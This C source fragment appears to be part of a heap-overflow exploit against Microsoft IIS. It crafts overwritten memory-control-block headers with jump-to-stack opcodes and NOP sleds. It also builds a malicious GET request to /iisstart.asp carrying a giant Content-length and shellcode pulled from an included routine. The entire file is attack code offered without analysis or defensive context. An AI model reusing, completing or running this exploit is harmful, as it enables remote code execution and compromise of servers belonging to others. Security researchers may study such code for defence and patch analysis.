

//#include "getshellcode.c"




int  getoverbuff(char *overbuff)
{

  #define  MCBSIZE       0x8
  #define  MEMSIZE       0xb200

  char buff7[]= "\x10\x00\x01\x02\x03\x04\x05\x06\x1c\xf0\xfd\x7f\x20\x21\x00\x01";
  char buff11[]= "\x02\x00\x01\x02\x03\x04\x05\x06\x22\x22\x00\x01\x22\x22\x00\x01";
  char buff10[]="\x20\x21\x00\x01\x20\x21\x00\x01";
  char buff9[]= "\x20\x21\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30";
  char buff8[]= "\x81\xec\xff\xe4\x90\x90\x90\x90\x90\x90\x90\x90\x90";
 
  
  char  buff[BUFFSIZE];
  int   i,j,k;

  memset(buff,NOPCODE,BUFFSIZE);



     buff7[0]=MCBSIZE;
    
	 j=MEMSIZE+0x10;
	 i=0;
     for(k=0;i<0xc000;i+=0x10)
	 {
         if(i>=j)
		 {
			  
    		   k=((i-j)/(MCBSIZE*8));
               if(k<=6)
			   {
                   memcpy(buff7+0x8,buff10,8);
				   buff7[0x8]=buff8[k];
                   buff7[0xc]=buff9[k];
               }
			   else memcpy(buff7,buff11,0x10);
		 }  
	     memcpy(buff+i,buff7,0x10);
	   
	 }
	 memcpy(overbuff,buff,0xc000);
     return 0xc000;
}



int  GetOverStr(char *buffer,char *server,char *urlfile,int offset)
{

  char    shellcodebuff[BUFFSIZE];
  char    overbuff[BUFFSIZE];
  int     i,j;

  char    *url="/iisstart.asp";

  char    overstr[]="GET %s?!!ko HTTP/1.1\r\nHOST:%s\r\nContent-Type: application/x-www-form-urlencoded%s\r\nContent-length: 2147506431\r\n\r\n";

  if(urlfile!=NULL) url=urlfile;

  memset(shellcodebuff,'7',BUFFSIZE);//NOPCODE,BUFFSIZE);
  i=getoverbuff(overbuff);
  j=GetShellcode(shellcodebuff+0x1000);
  for(j=0;j<=0xe000;j+=4)
  {
      strcat(shellcodebuff,"\x41\x41\x41\x41"); 
  } 

  _snprintf(buffer,BUFFSIZE,overstr,url,server,shellcodebuff);
  j=strlen(buffer);
  memcpy(buffer+j,overbuff,i);
  return (j+i);
}